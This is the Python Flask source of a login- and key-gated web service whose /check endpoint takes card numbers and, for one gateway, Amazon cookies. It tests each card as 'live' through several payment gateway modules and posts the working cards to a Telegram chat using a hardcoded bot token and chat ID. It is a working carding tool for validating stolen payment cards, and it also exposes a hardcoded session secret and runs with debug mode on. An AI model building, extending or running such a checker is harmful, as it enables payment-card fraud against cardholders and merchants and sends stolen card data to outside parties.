from flask import Flask, request, jsonify, send_from_directory, session, redirect, url_for, render_template, flash
from flask_cors import CORS
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
import requests as req
import asyncio
import tec, red, em, amazon

app = Flask(__name__)
app.secret_key = 'tu_secreto_super_seguro'  # Cambiar a algo fuerte y secreto
CORS(app)

# Configuración base de datos SQLite
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Modelos
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)
    key = db.Column(db.String(50), unique=True, nullable=False)

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)
    def check_password(self, password):
        return check_password_hash(self.password_hash, password)

class Key(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    key = db.Column(db.String(50), unique=True, nullable=False)
    used = db.Column(db.Boolean, default=False)

@app.before_request
def create_tables():
    db.create_all()

# Rutas para HTML/CSS estáticos
@app.route('/')
def index():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return render_template('index.html')  # Aquí se muestra el login

@app.route('/style.css')
def style():
    return send_from_directory('.', 'style.css')

# Registro
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username'].strip()
        password = request.form['password']
        key_input = request.form['key'].strip()

        key_obj = Key.query.filter_by(key=key_input, used=False).first()
        if not key_obj:
            flash('La key no es válida o ya fue usada.', 'error')
            return redirect(url_for('register'))

        if User.query.filter_by(username=username).first():
            flash('El usuario ya existe.', 'error')
            return redirect(url_for('register'))

        user = User(username=username, key=key_input)
        user.set_password(password)
        db.session.add(user)
        key_obj.used = True
        db.session.commit()
        flash('Registro exitoso, ya puedes iniciar sesión.', 'success')
        return redirect(url_for('index'))
    return render_template('register.html')

# Login (solo POST)
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username'].strip()
    password = request.form['password']
    user = User.query.filter_by(username=username).first()
    if user and user.check_password(password):
        session['user_id'] = user.id
        session['username'] = user.username
        flash('Has iniciado sesión con éxito.', 'success')
        return redirect(url_for('dashboard'))
    else:
        flash('Usuario o contraseña incorrectos.', 'error')
        return redirect(url_for('index'))

# Dashboard protegido
@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('index'))
    return render_template('checker.html', username=session['username'])

# Logout
@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

# Telegram bot token y chat
TELEGRAM_BOT_TOKEN = '7549342155:AAGTeGoCr6s56nckuq8KEDDB7aCKiU5BW3Y'
TELEGRAM_CHAT_ID = '-1002762787906'

def enviar_telegram(mensaje):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': mensaje,
        'parse_mode': 'Markdown'
    }
    req.post(url, data=data)

# Endpoint para check tarjetas (protegido)
@app.route('/check', methods=['POST'])
async def check_card():
    if 'user_id' not in session:
        return jsonify({'status': 'error', 'message': 'No autorizado'}), 401

    data = request.get_json()
    cc = data.get('cc')
    gateway = data.get('gateway', 'TEC')
    cookie = data.get('cookie', '')

    if gateway == 'TEC':
        result = await tec.process_card(cc)
    elif gateway == 'RED':
        result = await red.process_card(cc)
    elif gateway == 'EM':
        result = await em.process_card(cc)
    elif gateway == 'AMAZON':
        result = amazon.procesar_tarjeta_amazon(cc, cookie)  # Síncrono
    else:
        result = {'status': 'error', 'message': 'Gateway no válido', 'cc': cc}

    if result['status'] == 'live':
        mensaje_telegram = f"✅ *LIVE* - {result['cc']}\n{result['message']}"
        enviar_telegram(mensaje_telegram)

    return jsonify(result)

if __name__ == '__main__':
    app.run(debug=True)
